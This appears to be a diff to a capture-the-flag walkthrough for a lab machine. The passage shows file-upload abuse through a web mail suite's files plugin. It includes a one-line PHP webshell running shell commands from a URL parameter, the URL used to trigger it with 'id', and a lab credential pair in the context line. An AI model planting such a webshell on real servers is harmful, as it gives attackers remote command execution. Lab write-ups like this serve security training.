@@ -43,25 +43,41 @@ deborah.hernandez / 8F5cgp@tC8g@
 
 <img width="1919" height="801" alt="image" src="https://github.com/user-attachments/assets/ec2eafd7-dea7-476c-a3c0-21d5984f9e17" />
 
+## digging into sittings found some plugins 
 
+<img width="1919" height="581" alt="image" src="https://github.com/user-attachments/assets/20d80938-3606-445a-add9-d8226ee955c7" />
 
+## in files plugin  add files account
 
+<img width="1919" height="621" alt="image" src="https://github.com/user-attachments/assets/8e17cdb3-6960-47fe-9867-ad876ebc981f" />
 
+## i will try to upload simple webshell 
 
+```php
+<?php system($_GET['cmd']); ?>
+```
 
+<img width="1919" height="448" alt="image" src="https://github.com/user-attachments/assets/76f2569f-b918-4786-b288-891154ff7dd1" />
 
+## but here it's uploaded path i checked :
 
+```
+https://grommunio.autopilot.htb/files/index.php/apps/files/files
+```
 
+**`and found the path `**
 
+<img width="1916" height="580" alt="image" src="https://github.com/user-attachments/assets/958a3940-11b5-43fb-92e5-1306fdb79906" />
 
+## now let's trigger it 
 
+```
+https://10.129.234.223/files/data/deborah.hernandez/files/shell.php?cmd=id
+```
 
+<img width="1245" height="219" alt="image" src="https://github.com/user-attachments/assets/ef6efe50-4d00-4cea-b434-082207321dc4" />
 
-
-
-
-
-
+## bingo we got webshell
 
 
 
